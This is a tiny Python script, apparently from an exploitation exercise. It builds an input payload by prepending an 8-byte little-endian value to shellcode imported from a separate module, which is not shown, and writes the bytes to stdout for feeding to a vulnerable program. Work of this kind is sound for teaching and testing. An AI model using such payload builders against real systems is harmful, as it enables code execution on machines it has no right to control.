#!/usr/bin/env python3

import sys
import struct

from shellcode import shellcode

input = 0xE.to_bytes(8, "little")+shellcode
sys.stdout.buffer.write(input)
#sys.stdout.buffer.write(shellcode)